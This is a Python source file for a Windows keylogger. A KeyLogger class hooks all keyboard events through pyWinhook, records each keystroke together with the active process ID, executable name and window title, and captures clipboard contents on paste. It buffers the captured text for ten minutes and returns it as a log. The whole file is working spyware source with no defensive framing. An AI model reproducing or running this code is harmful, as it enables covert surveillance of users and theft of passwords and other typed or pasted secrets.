from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.current_window = None
        
    def get_current_process(self):
        print("gcp")
        # get a handle to the active window
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        # use active window handle to get the process ID
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        # open process
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        # find the executable name
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        window_title = create_string_buffer(512)
        # get the window title
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print(f'\n[ PID: {process_id} - {executable.value.decode()} - {self.current_window} ]\n')

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        # check if user changed window since last keystroke, if so get new process info
        if event.WindowName != self.current_window:
            self.get_current_process()
        # print keystroke if ASCII-printable, otherwise print the key name
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

def run():
    print("run")
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    # hook all keyboard events
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == "__main__":
    print(run())
    print('done.')